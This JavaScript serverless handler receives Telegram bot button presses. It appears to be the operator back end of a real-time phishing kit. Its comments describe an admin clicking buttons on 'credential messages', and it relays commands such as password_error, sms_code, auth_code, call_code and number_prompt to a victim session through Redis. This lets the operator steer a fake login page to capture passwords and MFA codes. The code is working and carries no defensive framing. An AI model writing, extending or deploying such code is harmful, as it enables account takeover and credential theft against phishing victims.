/**
 * Telegram Bot Callback Handler
 *
 * Processes inline keyboard button presses from the Telegram Bot API.
 * When an admin clicks a button on a credential message, this function:
 *   1. Parses the callback_query from Telegram
 *   2. Stores the command in Redis keyed by sessionId
 *   3. Answers the callback query so the Telegram spinner disappears
 *
 * Expected callback_data format: "<command>:<sessionId>"
 * Commands: yes_prompt | password_error | sms_code | auth_code | call_code | number_prompt | success
 */

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

const VALID_COMMANDS = [
  'yes_prompt',
  'password_error',
  'sms_code',
  'auth_code',
  'call_code',
  'number_prompt',
  'success',
];

const COMMAND_LABELS = {
  yes_prompt: '✅ Yes Prompt',
  password_error: '❌ Password Error',
  sms_code: '📝 SMS Code',
  auth_code: '📝 Authenticator Code',
  call_code: '📝 Call Code',
  number_prompt: '📝 Number Prompt',
  success: '✅ Success',
};

async function getRedis() {
  const url = process.env.UPSTASH_REDIS_REST_URL;
  const token = process.env.UPSTASH_REDIS_REST_TOKEN;
  if (!url || !token) return null;
  const { Redis } = await import('@upstash/redis');
  return new Redis({ url, token });
}

export const handler = async (event) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method not allowed' }) };
  }

  try {
    const body = JSON.parse(event.body || '{}');

    // --- Handle callback_query from Telegram ---
    const callbackQuery = body.callback_query;
    if (!callbackQuery) {
      return { statusCode: 200, headers, body: JSON.stringify({ ok: true, note: 'No callback_query' }) };
    }

    const callbackData = callbackQuery.data || '';
    const callbackId = callbackQuery.id;
    const chatId = callbackQuery.message?.chat?.id;
    const messageId = callbackQuery.message?.message_id;

    // Parse "<command>:<sessionId>"
    const colonIdx = callbackData.indexOf(':');
    if (colonIdx === -1) {
      await answerCallback(callbackId, '⚠️ Invalid data');
      return { statusCode: 200, headers, body: JSON.stringify({ ok: false, error: 'Invalid callback data format' }) };
    }

    const command = callbackData.substring(0, colonIdx);
    const sessionId = callbackData.substring(colonIdx + 1);

    if (!VALID_COMMANDS.includes(command)) {
      await answerCallback(callbackId, '⚠️ Unknown command');
      return { statusCode: 200, headers, body: JSON.stringify({ ok: false, error: 'Unknown command' }) };
    }

    if (!sessionId) {
      await answerCallback(callbackId, '⚠️ Missing session');
      return { statusCode: 200, headers, body: JSON.stringify({ ok: false, error: 'Missing sessionId' }) };
    }

    // Store command in Redis
    const redis = await getRedis();
    if (redis) {
      await redis.set(`smartbot:${sessionId}`, JSON.stringify({
        command,
        timestamp: new Date().toISOString(),
        sentBy: callbackQuery.from?.username || callbackQuery.from?.id || 'admin',
      }), { ex: 600 }); // 10 minute TTL
    } else {
      // Fallback: in-memory (not recommended for production)
      global._smartBotCommands = global._smartBotCommands || {};
      global._smartBotCommands[sessionId] = {
        command,
        timestamp: new Date().toISOString(),
      };
    }

    // Answer the callback query with confirmation
    const label = COMMAND_LABELS[command] || command;
    await answerCallback(callbackId, `${label} sent!`);

    // Edit the original message to show which command was selected
    if (chatId && messageId) {
      await editMessageReplyMarkup(chatId, messageId, command, sessionId);
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ ok: true, command, sessionId }),
    };

  } catch (error) {
    console.error('botCallback error:', error);
    return {
      statusCode: 200, // Return 200 to Telegram regardless
      headers,
      body: JSON.stringify({ ok: false, error: error.message }),
    };
  }
};

/**
 * Answer the Telegram callback query to dismiss the loading spinner.
 */
async function answerCallback(callbackQueryId, text) {
  if (!TELEGRAM_BOT_TOKEN || !callbackQueryId) return;
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callbackQueryId,
        text,
        show_alert: false,
      }),
    });
  } catch (err) {
    console.error('answerCallback error:', err.message);
  }
}

/**
 * Edit the inline keyboard on the original message to show which command was picked.
 * Replaces all buttons with a single button showing the selected action.
 */
async function editMessageReplyMarkup(chatId, messageId, selectedCommand, sessionId) {
  if (!TELEGRAM_BOT_TOKEN) return;
  try {
    const label = COMMAND_LABELS[selectedCommand] || selectedCommand;
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        message_id: messageId,
        reply_markup: {
          inline_keyboard: [
            [{ text: `🔘 ${label} (sent)`, callback_data: `noop:${sessionId}` }],
          ],
        },
      }),
    });
  } catch (err) {
    console.error('editMessageReplyMarkup error:', err.message);
  }
}
